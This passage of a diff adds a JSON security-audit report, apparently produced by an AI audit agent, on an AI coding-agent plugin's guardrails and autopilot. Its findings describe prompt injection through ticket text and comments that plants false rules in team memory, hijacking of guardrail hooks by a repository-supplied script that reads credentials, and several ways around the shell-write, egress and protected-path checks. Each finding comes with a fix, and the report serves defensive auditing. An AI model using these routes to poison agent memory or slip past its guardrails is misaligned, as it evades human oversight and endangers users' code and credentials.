+              "attackPath": "Outsider ticket text -> scaffold/spec/execute stage model -> Write to .agents/memory/MEMORY.md and gotchas/x.md (a line phrased as an operating rule) -> the next session of any agent on that checkout loads the index as trusted project instructions -> steered behaviour in sessions that hold write, push and tracker rights. If an execute stage commits it, it reaches the code PR, where review is the only control.",
+              "exploit": "A ticket claims a verified team gotcha that tells agents to skip the guardrail or run a script, and asks to record it in team memory.",
+              "mitigationExamined": "Entries committed by a stage land in a PR. The pre-commit hook lints form (templates/.githooks/pre-commit.tmpl:37-77). The protected-path list covers .claude/ and the root instruction files. None is a provenance control, and none protects uncommitted working-tree edits.",
+              "fix": "Add .agents/memory/ and nested AGENTS.md/CLAUDE.md/GEMINI.md and .cursor/rules to the autopilot protected set. Add a rule to the remember gate that facts originating in ticket text, linked pages, PR text or tool output are never saved without the human partner restating them. Have the engine fail a stage whose run changed files outside the frozen scope." },
+            { "severity": "Low", "confidence": 6, "category": "Prompt injection", "title": "Scaffold and spec stages read every ticket commenter's text, unlike the changes stage, and the ticket title lands unmarked in the brief", "file": "skills/new-task/scripts/fetch-ticket.mjs", "line": 284,
+              "description": "commentsFor and the Odoo chatter read (fetch-ticket.mjs:284-302, 344-346) pass all messages to source.md with no check of the author's permission. The changes stage does filter by write access and the approvers list (autopilot.mjs:256-285). The ticket title is written verbatim as the brief heading (scaffold-task.sh:99) outside any quote markers. In full mode the engine approves its own packet (autopilot.mjs:505-514), so no human reads the spec or plan before execute. Link fetching relies on advisory annotations and a text-only host check (fetch-ticket.mjs:208-237).",
+              "attackPath": "Any commenter on a public issue -> source.md Messages -> brainstorm-task Step 4b -> spec stage model, with a plan executed unreviewed in full mode. Entry point for the three Medium findings above.",
+              "exploit": "A comment on a ready-labelled public issue holds instructions aimed at the spec agent.",
+              "mitigationExamined": "Quote markers with escaped comment openers, body capped at 64 KB, a data-not-instructions line, Red Flags rows, and the ready label requiring a permitted account. In gated mode a human reviews the spec and plan.",
+              "fix": "Apply the same author-permission filter in fetch-ticket.mjs as in writeChangesComments. Quote the title in the brief. Resolve the link host and re-check it after redirects at the tool layer. Consider refusing full mode for sources whose tracker accepts comments from non-members." },
+            { "severity": "Low", "confidence": 6, "category": "Tool misuse", "title": "Kimi and Antigravity guardrail hook commands are working-directory-relative", "file": ".kimi-plugin/plugin.json", "line": 28,
+              "description": "The Kimi manifest registers 'node ./hooks/lib/guardrail-cli.mjs' and the root hooks.json (Antigravity) 'node hooks/lib/guardrail-cli.mjs --antigravity', with no plugin-root variable. If a harness resolves the path against the project directory, the guardrail never runs or runs a repository-supplied file. Kimi is already listed as fail-open on hook error (harnesses.mjs:103). Merged with the code 8 Medium of the same class.",
+              "attackPath": "A hostile repository ships hooks/lib/guardrail-cli.mjs -> the user opens it in Kimi Code with the plugin installed -> the hook command resolves in the repository -> arbitrary code runs on the first tool call, or the guardrail is absent during a run.",
+              "exploit": "A repository includes a hooks/lib/guardrail-cli.mjs that reads credentials and always exits 0.",
+              "mitigationExamined": "tests/antigravity says the script path is relative to the plugin root; no equivalent evidence for Kimi.",
+              "fix": "Use an absolute path the harness expands or resolve relative to the manifest's own directory. Add a test that runs the hook with an unrelated cwd containing a decoy guardrail-cli.mjs." }
+          ],
+          "cves": [],
+          "discarded": [
+            "qa-specialist frontmatter disallowedTools names playwright tools that would not match a plugin-namespaced MCP, but the guardrail denies *run_code* and *browser_evaluate* by pattern during any run, so no gap",
+            "templates/.mcp.json remote http servers (microsoftdocs, deepwiki): unauthenticated, no secrets; an injection channel only",
+            "npx -y with exact pinned versions in templates/.mcp.json: no lockfile integrity hash, supply-chain hardening only",
+            "GitHub ticket MCP server sends a bearer token to api.githubcopilot.com with X-MCP-Readonly: intended and read-only",
+            "Brainstorm companion server: per-session key, constant-time compare, loopback bind, origin check, CSP; screens are agent-authored HTML so injected script is speculative",
+            "Odoo markdownToNoteHtml and textToNoteHtml: every text is HTML-escaped before inline markup",
+            "task-review reviewers and qa-lane-6 run the branch's tests and configured suite commands unsandboxed: inherent to running the code under review",
+            "template .claude/settings.json allows Bash(npm test:*), pytest, cargo test: common convention, not an ultrapowers-specific path",
+            "loadSecretsFile copies credential-named variables into the stage environment so MCP servers work: documented behaviour"
+          ],
+          "declined": [
+            "A Bash call listing the plugin manifests was denied by the hunt guardrail; not worked around, the files were read with Read instead",
+            "Not read: skill bodies other than autopilot, brainstorm-task, new-task, team-memory; hunt-preflight.mjs and qa-preflight.mjs; the whole of hooks/lib/qa-shell-writes.mjs beyond its protected-path constants; tests/, docs/, specs and plans trees",
+            "No test, build or server was run and no network read command issued, so the claim that an explicit --mcp-config file skips the project MCP approval prompt rests on harness behaviour that was not exercised"
+          ],
+          "skipped": "",
+          "filesRead": ["autopilot engine scripts (autopilot, autopilot-lib, repos, tracker, odoo, harnesses)", "autopilot SKILL.md and stage prompts", "new-task scripts (fetch-ticket, scaffold-task, ticket-sources grep)", "brainstorming server", "post-review.mjs", "run-suite.sh", "init.mjs (lines 540-680)", "team-memory SKILL.md", "hooks/qa-guardrail, session-start, team-memory hooks, guardrail-bridge, guardrail-cli, hooks.json files", ".hermes-plugin/__init__.py", ".opencode and .pi adapters", "plugin manifests", "templates/.mcp.json and template settings and pre-commit hook", ".agents/ultrapowers.json and memory index", "agents/qa-specialist.md (head)"]
+        }
+      ],
+      "verifications": [
+        { "title": "Hermes plugin resolves node through the working directory on Windows", "verdict": "confirmed", "confidence": 7, "reason": "At .hermes-plugin/__init__.py:283 shutil.which(\"node\") searches the Hermes process's working directory first on Windows, nothing sets NoDefaultCurrentDirectoryInExePath, and line 288 runs the result whenever a run marker exists, so a planted node.exe/.cmd/.bat runs on every guarded tool call; the one step the repository does not show is native-Windows Hermes, which its tests and bridge treat as supported." },
+        { "title": "Command substitutions, backticks and unquoted heredoc bodies are opaque to the shell-write analysis", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429) ended the verifier before it returned a block; no verdict guessed" },
+        { "title": "cd handling: tilde and unscoped directory across subshells and pipelines", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "$'..' and $\"..\" quoting is tokenized as literal text, hiding paths and names from the write analysis", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Autopilot protected-path matching ignores glob and brace expansion", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Secret-file rule matches only literal spelling, omits credential files, and the token-variable check is autopilot-only", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "git -c is skipped and read-only git subcommands can run a configured command in QA and hunt", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": ".ultrapowers/ is writable in QA and hunt runs, so the run marker can be removed or widened", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "PowerShell tool command is analysed as POSIX shell", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "MCP tracker-write rule is gated on the autopilot profile only", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Write analysis is a program-name deny-list, so unlisted programs and project scripts can write or execute", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "A symlink created in the same command is not resolved when write paths are checked", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Egress host allow-list inspects only https URLs, so extra curl/wget operands escape it", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Autopilot envelope does not protect .mcp.json or other harness MCP/config files, which the next headless stage loads outside the guardrail", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed (merged: ai-surface and code 7)" },
+        { "title": "URL-carrying tools (WebFetch, Firecrawl, browser tools) have no egress restriction in autopilot stages unless qa.hosts.allowed or qa.urls is set", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Team memory and nested instruction files are writable by autopilot stages, and uncommitted edits bypass PR review", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "In nested worktrees .git is a file the guardrail does not protect, so a stage can redirect gitdir and make engine git run attacker config", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "hunt-preflight and sibling scripts resolve tools through the checkout's working directory on Windows", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" },
+        { "title": "Antigravity and Kimi guardrail hook commands are working-directory-relative", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed (merged: code 8 and ai-surface)" },
+        { "title": "Scaffolded Claude settings pre-approve git diff and git blame, which can read files the Read deny rules protect", "verdict": "unverified", "confidence": 0, "reason": "verifier failed: org monthly spend limit (HTTP 429); no verdict guessed" }
+      ]
+    }
+  ]
+}
